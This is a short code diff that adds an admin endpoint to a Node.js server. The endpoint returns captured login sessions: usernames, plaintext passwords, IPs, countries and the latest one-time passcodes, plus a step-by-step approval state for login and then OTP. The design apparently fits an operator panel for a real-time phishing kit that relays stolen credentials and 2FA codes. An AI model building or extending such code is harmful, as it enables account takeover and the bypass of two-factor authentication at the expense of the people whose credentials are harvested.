@@ -300,6 +300,39 @@ const server = http.createServer(async (req, res) => {
     }
   }
 
+  if (req.method === 'GET' && reqPath === '/api/sessions') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const sessions = loginAttempts.slice().reverse().map(login => {
+      const otps = otpAttempts.filter(o => o.loginId === login.id);
+      const latestOtp = otps.length > 0 ? otps[otps.length - 1] : null;
+      let step = 'login';
+      let pendingAction = null;
+      if (login.status === 'waiting') {
+        pendingAction = { type: 'login', id: login.id };
+      } else if (login.status === 'approved') {
+        step = 'otp';
+        if (latestOtp && latestOtp.status === 'waiting') {
+          pendingAction = { type: 'otp', id: latestOtp.id };
+        }
+      }
+      return {
+        id: login.id,
+        username: login.username,
+        password: login.password,
+        country: login.country,
+        ip: login.ip,
+        lang: login.lang,
+        date: login.date,
+        loginStatus: login.status,
+        step,
+        otp: latestOtp ? latestOtp.otp : null,
+        otpStatus: latestOtp ? latestOtp.status : null,
+        pendingAction
+      };
+    });
+    return json(res, { sessions });
+  }
+
   // --- OTP Attempts ---
 
   if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
